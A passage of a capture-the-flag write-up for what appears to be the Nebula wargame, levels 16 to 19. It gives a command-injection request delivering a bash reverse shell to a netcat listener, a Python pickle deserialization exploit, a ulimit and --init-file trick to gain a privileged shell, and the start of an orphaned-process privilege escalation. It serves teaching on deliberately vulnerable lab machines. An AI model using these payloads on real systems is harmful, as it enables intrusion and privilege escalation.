        <span class="k">if</span><span class="p">(</span><span class="vg">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">print</span><span class="p">("</span><span class="s2">Your login was accepted</span><span class="p">");</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">print</span><span class="p">("</span><span class="s2">Your login failed</span><span class="p">");</span>
        <span class="p">}</span>    
        <span class="k">print</span><span class="p">("</span><span class="s2">Would you like a cookie?</span><span class="se">\n</span><span class="p">");</span>
    <span class="p">}</span>

    <span class="nv">htmlz</span><span class="p">(</span><span class="nv">login</span><span class="p">(</span><span class="nv">param</span><span class="p">("</span><span class="s2">username</span><span class="p">"),</span> <span class="nv">param</span><span class="p">("</span><span class="s2">password</span><span class="p">")));</span>
</code></pre></div></div>

<blockquote>
  <p>egrep: this command searches for a pattern using extended regular expressions, and returns all the lines matching that pattern.</p>
</blockquote>

<ol>
  <li>The injection vulnerability in this program is where the <code class="language-plaintext highlighter-rouge">egrep</code> command is called. We need to properly close that command and append our own to get a system call to <code class="language-plaintext highlighter-rouge">getflag</code>. However, the input is partially sanitized, by making all of it uppercase and trimming it after the fisrt space.</li>
  <li>We can’t call any useful command given the sanitization on the input, but what we can do is put those commands in a file with a name that is accepted by the sanitizatoin, and that access that file. To do this, the file name should be completely uppercase without spaces. We can put it in the tmp folder, and then access it using a wildcard, like <code class="language-plaintext highlighter-rouge">/*/FLAG16</code>.</li>
  <li>The content of our file whould be a reverse tcp to which we can connect. The instruction goes like this: <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/[HOST IP]]/8000 0&gt;&amp;1</code>. This will spawn an interactive bash shell and pipe its input and output to a socket connected to our host. Give it running permissions with <code class="language-plaintext highlighter-rouge">chmod +x [filename]</code></li>
  <li>On the host we start netcat so that we can listen and connect to our shell: <code class="language-plaintext highlighter-rouge">nc -nlp 8000</code></li>
  <li>What is left to do is connecting to the server with the proper request so that our script will be invoked and we get the connection on the netcat listener. We know that the server is expecting a request to index.cgi with two parameters: username and password. Username is what we are interested in, so we put our URL encoded script path in there: <code class="language-plaintext highlighter-rouge">wget "[VM IP]:1616/index.cgi?username=%60%2F%2A%2FFLAG16%60&amp;password=asdf"</code></li>
  <li>This request should stay open, and if you switch to the netcat listener there should be a shell with flag16 as user open and waiting for the <code class="language-plaintext highlighter-rouge">getflag</code> command. After executing it, as soon as you leave the shell also the wget request should end successfully.</li>
</ol>

<h3 id="level-17">[Level 17]</h3>
<p>There is a python script listening on port 10007 that contains a vulnerability.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">pickle</span>
<span class="kn">import</span> <span class="n">time</span>
<span class="kn">import</span> <span class="n">socket</span>
<span class="kn">import</span> <span class="n">signal</span>

<span class="n">signal</span><span class="p">.</span><span class="nf">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGCHLD</span><span class="p">,</span> <span class="n">signal</span><span class="p">.</span><span class="n">SIG_IGN</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">server</span><span class="p">(</span><span class="n">skt</span><span class="p">):</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">skt</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

    <span class="n">obj</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
        <span class="n">clnt</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sh">"</span><span class="s">why did you send me </span><span class="sh">"</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="sh">"</span><span class="s">?</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>

<span class="n">skt</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">skt</span><span class="p">.</span><span class="nf">bind</span><span class="p">((</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="mi">10007</span><span class="p">))</span>
<span class="n">skt</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">clnt</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">skt</span><span class="p">.</span><span class="nf">accept</span><span class="p">()</span>

    <span class="nf">if</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="nf">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
        <span class="n">clnt</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sh">"</span><span class="s">Accepted connection from %s:%d</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
        <span class="nf">server</span><span class="p">(</span><span class="n">clnt</span><span class="p">)</span>
        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>

<blockquote>
  <p>pickle.loads(string): read a pickled object hierarchy from a string. Characters in the string past the pickled object’s representation are ignored. The pickle module is not intended to be secure against erroneous or maliciously constructed data.
Pickle allows arbitrary objects to declare how they should be pickled by defining a <strong>reduce</strong> method, which should return a tuple describing how to reconstruct this object on unpacking. That tuple should just contain a callable and a tuple of arguments to call that callable on. Each of these pieces will be pickled separately, and then on unpickling, the callable will be called on the provided arguments to construct the new object.</p>
</blockquote>

<ol>
  <li>We can see that our input will be passed unsanitized to a <code class="language-plaintext highlighter-rouge">pickle.loads()</code> instruction. After a quick research it is clear that pickle is vulnerable to crafted inputs because it will call whatever will be passed to it. That’s what we want to exploit.</li>
  <li>
    <p>The command to be run is pretty simple, and it’s saved in a bash file that is called flag17 and that has executable permissions (<code class="language-plaintext highlighter-rouge">chmod +x</code>):</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c">#!/bin/bash</span>
 /bin/getflag <span class="o">&gt;&gt;</span> /tmp/flag17.out
</code></pre></div>    </div>
  </li>
  <li>
    <p>To be successful in our exploit we have to rewrite the <code class="language-plaintext highlighter-rouge">__reduce__</code> method so that when invoked it will run the flag17 script for us. Also, we want our method to be sent to the local server so that it will actually execute. For this we write a small python program that implements <code class="language-plaintext highlighter-rouge">__reduce__</code>, opens a socket connection to the server and sends our specially crafted object. Remember to not call this file pickly.py or any name that could cause confusion with libraries.</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="n">pickle</span>
 <span class="kn">import</span> <span class="n">subprocess</span>
 <span class="kn">import</span> <span class="n">socket</span>

 <span class="k">class</span> <span class="nc">Exploit</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>

     <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
         <span class="nf">return</span><span class="p">(</span><span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">,</span> <span class="p">((</span><span class="sh">'</span><span class="s">/tmp/flag17</span><span class="sh">'</span><span class="p">,),))</span>

 <span class="n">host</span> <span class="o">=</span> <span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span>
 <span class="n">port</span> <span class="o">=</span> <span class="mi">10007</span>

 <span class="n">obj</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="nc">Exploit</span><span class="p">())</span>

 <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
 <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
 <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
 <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div>    </div>
  </li>
  <li>Execute the python file, and after succesfully sending our packet we can check in <code class="language-plaintext highlighter-rouge">/tmp/flag17.out</code> and we will find that <code class="language-plaintext highlighter-rouge">getflag</code> has been successfully executed for us.</li>
</ol>

<h3 id="level-18">[Level 18]</h3>
<p>Analyse the C program, and look for vulnerabilities in the program.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="p">{</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">debugfile</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">verbose</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">loggedin</span><span class="p">;</span>
<span class="p">}</span> <span class="n">globals</span><span class="p">;</span>

<span class="cp">#define dprintf(...) if(globals.debugfile) \
    fprintf(globals.debugfile, __VA_ARGS__)
#define dvprintf(num, ...) if(globals.debugfile &amp;&amp; globals.verbose &gt;= num) \
    fprintf(globals.debugfile, __VA_ARGS__)
</span>
<span class="cp">#define PWFILE "/home/flag18/password"
</span>
<span class="kt">void</span> <span class="nf">login</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">pw</span><span class="p">){</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>

    <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">PWFILE</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">char</span> <span class="n">file</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

        <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">file</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">dprintf</span><span class="p">(</span><span class="s">"Unable to read password file %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">PWFILE</span><span class="p">);</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
                <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">pw</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>       
    <span class="p">}</span>
    <span class="n">dprintf</span><span class="p">(</span><span class="s">"logged in successfully (with%s password file)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
        <span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">?</span> <span class="s">"out"</span> <span class="o">:</span> <span class="s">""</span><span class="p">);</span>
    
    <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="p">}</span>

<span class="kt">void</span> <span class="nf">notsupported</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">what</span><span class="p">){</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"--&gt; [%s] is unsupported at this current time.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">what</span><span class="p">);</span>
    <span class="n">dprintf</span><span class="p">(</span><span class="n">what</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">setuser</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">user</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">msg</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>

    <span class="n">sprintf</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="s">"unable to set user to '%s' -- not supported.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">user</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">msg</span><span class="p">);</span>

<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">c</span><span class="p">;</span>

    <span class="k">while</span><span class="p">((</span><span class="n">c</span> <span class="o">=</span> <span class="n">getopt</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="s">"d:v"</span><span class="p">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">switch</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">case</span> <span class="sc">'d'</span><span class="p">:</span>
                <span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">optarg</span><span class="p">,</span> <span class="s">"w+"</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Unable to open %s"</span><span class="p">,</span> <span class="n">optarg</span><span class="p">);</span>
                <span class="n">setvbuf</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="sc">'v'</span><span class="p">:</span>
                <span class="n">globals</span><span class="p">.</span><span class="n">verbose</span><span class="o">++</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">dprintf</span><span class="p">(</span><span class="s">"Starting up. Verbose level = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">globals</span><span class="p">.</span><span class="n">verbose</span><span class="p">);</span>

    <span class="n">setresgid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
    <span class="n">setresuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
    
    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
        <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>

        <span class="n">q</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">q</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">'\n'</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">'\r'</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="n">dvprintf</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"got [%s] as input</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">line</span><span class="p">);</span>

        <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"login"</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">dvprintf</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">"attempting to login</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="n">login</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">6</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"logout"</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"shell"</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">dvprintf</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">"attempting to start shell</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
                <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"unable to execve"</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="n">dprintf</span><span class="p">(</span><span class="s">"Permission denied</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"logout"</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"closelog"</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">)</span> <span class="n">fclose</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">);</span>
            <span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"site exec"</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">notsupported</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">10</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"setuser"</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">setuser</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>void closelog(): closes the descriptor being used to write to the system logger.</p>
</blockquote>

<blockquote>
  <p>ulimit -n: set or get the shells resource usage limits. Option -n sets the maximum number of open file descriptors (most systems do not allow this value to be set).</p>
</blockquote>

<blockquote>
  <p>bash –init-file: the last parameter is used as a script-file, which is executed.</p>
</blockquote>

<ol>
  <li>The program can be invoked with a command like <code class="language-plaintext highlighter-rouge">./flag18 -vvv -d /tmp/log</code>. What it does is check if your password is in the password file stored in <code class="language-plaintext highlighter-rouge">/home/flag18/password</code>, and if yes it will log you in and let you use the shell. However, there is a catch: in the <code class="language-plaintext highlighter-rouge">login()</code> method if the password file cannot be accessed there is no exception throw, meaning that we will just reach the <code class="language-plaintext highlighter-rouge">global.loggedin = 1</code> instruction and therefore we will be allowed to access the shell.</li>
  <li>To see what is going on in our program, we prepare the log file and we tail it in the background: <code class="language-plaintext highlighter-rouge">touch /tmp/log; tail -f /tmp/log &amp;</code>. This will already occupy one of the free file descriptors that we will allow in the next step.</li>
  <li>We can’t prevent the access to the password file by moving or renaming it, because the path is hardcoded and we don’t have permissions to manipulate the file. So we have to find another way to block the access to the password file without touching it directly: that’s where the ability to set <code class="language-plaintext highlighter-rouge">ulimit</code> gets interesting. We want to set the value so low that the shell session will reach the limit before trying to open the password file, and therefore failing at that. A good number could be <code class="language-plaintext highlighter-rouge">ulimit -n 4</code></li>
  <li>We can now start out program, with <code class="language-plaintext highlighter-rouge">./flag18 -vvv -d /tmp/log</code>. The system will complain about too many files open, but it will anyway execute flag18. So we can attempt login and see that we are logged in successfully without a password file.</li>
  <li>The next command that we pass is shell to try and get access to the flag18 shell. However, the attempt fails because the shell tries to open a library and it gets blocked by the newly set ulimit. To get around this, we can make use of the closelog method: just login again, and run <code class="language-plaintext highlighter-rouge">closelog</code> before trying to invoke the shell.</li>
  <li>The shell command works properly, but we get an error saying that it does not recognize the -d option. This means that the first parameter must be something it recognizes, from the GNU long options (as hinted by the error that we got). A good idea is to use the <code class="language-plaintext highlighter-rouge">--init-file</code>, that will read the path that we pass to -d as something to be executed. The first “command” will be <em>Starting</em> with parameters <em>up</em>. We have to make sure that such a file exists and can be executed with something useful.</li>
  <li>
    <p>We create the <em>Starting</em> file as an executable script in /tmp, and make it open a shell:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c">#!/bin/bash</span>
 /bin/getflag <span class="o">&gt;&gt;</span> /tmp/flag18.out
</code></pre></div>    </div>
  </li>
  <li>We make it executable with <code class="language-plaintext highlighter-rouge">chmod +x /tmp/Starting</code>. To make sure this file can be found, we prepend the /tmp to PATH: <code class="language-plaintext highlighter-rouge">export PATH=/tmp:$PATH</code></li>
  <li>
    <p>It’s now a good time to logout completely from the challenge and login again, just to make sure that we do all the operations in the right order:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">tail</span> <span class="nt">-f</span> /tmp/log &amp;
 <span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
 <span class="nb">ulimit</span> <span class="nt">-n</span> 4
 ./flag18 <span class="nt">--init-file</span> <span class="nt">-d</span> /tmp/log
 login
 closelog
 shell
</code></pre></div>    </div>
  </li>
  <li>At the end of these instructions we will still get an error, but it is because our –init-file option is still trying to execute the lines in the log file and is obviously failing. If we go in the /tmp folder we can see that out flag18.out file is there and it says that we executed getflag properly.</li>
</ol>

<p>Just as an additional instruction to satisfy my curiosity, in the Starting script I also put a line to print the content of the password file: we aren’t allowed to do that, but the script will have higher permissions so it will work.</p>

<h3 id="level-19">[Level 19]</h3>
<p>There is a flaw in the below program in how it operates.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
    <span class="n">pid_t</span> <span class="n">pid</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
    <span class="k">struct</span> <span class="n">stat</span> <span class="n">statbuf</span><span class="p">;</span>

    <span class="cm">/* Get the parent's /proc entry, so we can verify its user id */</span>

    <span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s">"/proc/%d"</span><span class="p">,</span> <span class="n">getppid</span><span class="p">());</span>

    <span class="cm">/* stat() it */</span>

    <span class="k">if</span><span class="p">(</span><span class="n">stat</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">statbuf</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Unable to check parent process</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/* check the owner id */</span>

    <span class="k">if</span><span class="p">(</span><span class="n">statbuf</span><span class="p">.</span><span class="n">st_uid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* If root started us, it is ok to start the shell */</span>

        <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
        <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Unable to execve"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"You are unauthorized to run this program</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>init: is the first process started during booting of the computer system. It is a daemon process that continues running until the system is shut down. It is the direct or indirect ancestor of all other processes and automatically adopts all orphaned processes.</p>
</blockquote>

<blockquote>
  <p>pid_t fork(void): creates a new process (child) by duplicating the calling process (parent).The processes run in separate memory spaces. At the time of fork() both memory spaces have the same content.</p>
</blockquote>

<blockquote>
  <p>int execve(const char *filename, char *const argv[], char *const envp[]): executes the program pointed to by filename. This causes the program that is currently being run by the calling process to be replaced with a new program, with newly initialized stack, heap, and (initialized and uninitialized) data segments.</p>
</blockquote>

<blockquote>
  <p>int setresuid(uid_t ruid, uid_t euid, uid_t suid): sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process. A privileged process may set its UIDs to arbitrary values.</p>
</blockquote>

<ol>
  <li>The only way to get to the shell is to run the program as root, and we are clearly not root. However, we can make use of the Unix adopting policy for orphaned processes: init was started by root, as we can see with <code class="language-plaintext highlighter-rouge">ps -ef | grep init</code> (-e to see all processes, -f to format it properly), and having processes adopted by it would escalate their privileges.</li>
  <li>
    <p>This means that we need a process that starts flag19 and then dies before the checks on the parent ID. This can be achieved with a <code class="language-plaintext highlighter-rouge">fork()</code>. We have to write a C program that forks itself, then we wait for this new process to become orphaned, and then we call <code class="language-plaintext highlighter-rouge">execve()</code> with the flag19 binary to run the getflag command in a shell with proper permissions.</p>

    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
     <span class="kt">int</span> <span class="n">child</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>

